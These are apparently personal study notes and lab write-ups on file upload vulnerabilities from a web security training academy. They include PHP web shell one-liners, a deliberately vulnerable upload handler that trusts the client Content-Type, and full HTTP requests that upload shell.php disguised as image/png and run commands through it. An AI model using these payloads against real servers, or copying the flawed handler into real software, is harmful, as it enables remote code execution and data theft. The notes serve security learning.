## What are File Upload Vulnerabilities?

When a web server gives a user the capability to upload a file to the server without validating things like the file's name, type, contents, or size. The upload functionality can be misused to upload dangerous files like server-side script that enable remote code execution

Then the following action with a HTTP request for the file, which forces the server to execute the file. 

## How do these vulns arise?

A dev may think that they have validated enough checks on the back end but with any blacklisting, it is easy to bypass it and miss out on obscure file types that are dangerous. 

The checks that are put in place can also be manipulated by an attacker using Burp Proxy or Repeater. 

Inconsistent validation across different hosts on the network can also be exploited. 

## Exploiting unrestricted file uploads 

When a server let's you upload server-side scripts like PHP, Java, or Python files, it is also configured to execute them as code. 

Getting a webshell is then trivial with one-line php code

One example for reading files can be

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Once uploaded a request for this file will return the target file's contents in the response

----
A more versatile one-liner would be

```php
<?php echo system($_GET['command']); ?>
```

Using a HTTP request

```http
GET /example/exploit.php?command=id HTTP/1.1
```

## Lab

### Remote Code Execution via Web Shell Upload

- I browsed around the website to see where the upload functionality lives
- I couldn't find anything on the site so I logged in with the username and password `wiener:peter` 
- I noticed the avatar upload feature
- I used the php one liner and then uploaded it 
- Since I used the command one, I changed the HTTP request to type in my commands
- I learned that for space i need to use the `%20` encoding 
- also the parameter command `?command=` 
- `?` is essential for the query
- `command` is how the script is going to get the variable and execute it, it could be anything
- i went to the dir `/home/carlos/secret` and tried to cat the output but i thing i noticed that anything that I typed in through the get parameter, i would get two responses
- so the cat output was concatenated and i didn't realize it until i looked at the solution

#### Community Solution

- this actually uses the path to the target file liner and then you call on to it directly
- i don't think i mentioned this above but the sitemap helped me learn where the file exists as in the location that i need to ping to get the php to execute. 


## Flawed File Type Validation
Adding a test here to ensure the changes take place in the repo

In HTML Forms, the browser sends the provided data using a `POST` request with the content type set to `application/x-www-form-urlencoded`. 

That's acceptable for simple text like name and address but it isn't suitable for large amounts of binary data, like images, or PDF documents. 

In those cases, the content type `multipart/form-data` is preferred. 

### Example

Below is the example of a form with different inputs and the request that would look like when the form is submitted

```HTTP
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
```

The message body is split into separate parts and each part has it's own `Content-Disposition` header that provides basic information about the input field it relates to. These parts may also contain their own `Content-Type` header which tells the server the MIME type of the data that was submitted using the input. 

Now one way to bypass the MIME checks is how the server trusts the files, and the type of validation is performed to check whether the contents of the file actually match the supposed MIME type. 

## Lab 2

### Web shell upload via Content-Type restriction bypass

This helped me understand the Content-Type header a bit better, because originally what I was trying to do is, upload the file and try to mask it using a png extension. 

Spent some time looking into how the extension was being managed, but then when the php shell disguised as png was uploaded. Nothing would happen, because the image was being shown statically on the back end, I used AI to write this code, i believe this is what was happening. 

```php
<?php
// Destination directory for uploads
$target_dir = "files/avatars/";
$target_file = $target_dir . basename($_FILES["avatar"]["name"]);

// 🚨 VULNERABILITY: Relying entirely on user-supplied Content-Type header
$file_type = $_FILES["avatar"]["type"]; 

// The server's weak checklist
$allowed_types = ["image/jpeg", "image/png"];

if (in_array($file_type, $allowed_types)) {
    // If the header SAYS it's a JPEG, the server blindly believes it
    if (move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded successfully.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
} else {
    // This is the error you saw before you intercepted the request
    echo "Security Error: Only JPG and PNG files are allowed.";
}
?>
```

I saw the header `application/octet-stream` in the `GET` request so I decided to change it to `image/png` but still uploaded the php file so the HTTP request looked like this

```http
POST /my-account/avatar HTTP/2
Host: 0afd00c503be36c480cd8a85002100cf.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrDgUKsZNxKBfFKoA
Upgrade-Insecure-Requests: 1

------WebKitFormBoundaryrDgUKsZNxKBfFKoA
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>

------WebKitFormBoundaryrDgUKsZNxKBfFKoA
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryrDgUKsZNxKBfFKoA
Content-Disposition: form-data; name="csrf"

1YPWvSuFlrc3dEuztVEzs492E1XdUKas
------WebKitFormBoundaryrDgUKsZNxKBfFKoA--
```

The request that got me the flag

```http
GET /files/avatars/shell.php?cmd=cat%20/home/carlos/secret HTTP/2
Host: 0afd00c503be36c480cd8a85002100cf.web-security-academy.net
Cookie: session=wmCzIoDaqcANgkjwcTbIncxZbLWotfCe
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afd00c503be36c480cd8a85002100cf.web-security-academy.net/my-account/avatar
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
 ```

